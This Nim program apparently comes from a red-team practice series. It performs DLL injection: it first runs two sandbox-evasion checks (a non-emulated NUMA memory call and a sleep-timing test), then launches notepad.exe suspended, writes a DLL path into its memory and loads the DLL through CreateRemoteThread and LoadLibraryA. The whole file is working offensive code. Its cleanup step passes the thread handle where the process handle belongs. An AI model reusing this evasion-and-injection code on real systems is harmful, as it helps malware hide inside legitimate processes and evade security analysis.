import winim/lean, std/osproc, std/times

let
    dll_path: LPCSTR = "C:\\Users\\svrat\\Documents\\Red-Team-Advent-of-Code\\18_DllInject\\create_file.dll"; 

when isMainModule:

    echo "[+] Running sandbox evasion using the non-emulated API VirtualAllocExNuma";
    let mem = VirtualAllocExNuma(GetCurrentProcess(), NULL, 0x1000, 0x3000, 0x4, 0);
    if mem == nil:
        echo "[-] (VirtualAllocExNuma) Failed check"
        quit(0)

    echo "[+] Delay of three seconds for scan bypass check"
    let time = cpuTime()
    Sleep(3000);
    let time_now = cpuTime()
    if time_now - time < 2.5:
        echo "[-] (Sleep) Failed check"
        quit(0)

    let injectedProc = startProcess("notepad.exe")
    injectedProc.suspend()
    
    echo "[*] Suspended process: ", injectedProc.processID

    let processHandle = OpenProcess(
        PROCESS_ALL_ACCESS,
        false,
        cast[DWORD](injectedProc.processID)
    )
    echo "[*] Injected proc handle: ", processHandle

    echo "[*] Allocating memory for dllpath in the target process"
    let dllMemoryPath = VirtualAllocEx(
        processHandle,
        NULL,
        cast[SIZE_T](dll_path.len + 1),
        MEM_COMMIT,
        PAGE_READWRITE
    )

    var bytesWritten: SIZE_T
    let writeProcess = WriteProcessMemory(
        processHandle,
        dllMemoryPath,
        cast[LPVOID](dll_path),
        cast[SIZE_T](dll_path.len + 1),
        addr bytesWritten
    )
    echo "[*] WriteProcessMemory: ", bool(writeProcess)
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    let load_dll_func = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA") #, dllMemoryPath, 0, 0)

    let threadHandle = CreateRemoteThread(
        processHandle,
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](load_dll_func),
        dllMemoryPath,
        0,
        NULL
    )
    echo "[+] Thread Handle: ", threadHandle

    WaitForSingleObject(threadHandle, INFINITE); 

    echo "[*] DLL loaded"

    echo "[!] Press enter to free memory and exit"
    discard stdin.readLine()
    VirtualFreeEx(threadHandle, dllMemoryPath, len(dll_path) + 1, MEM_RELEASE); 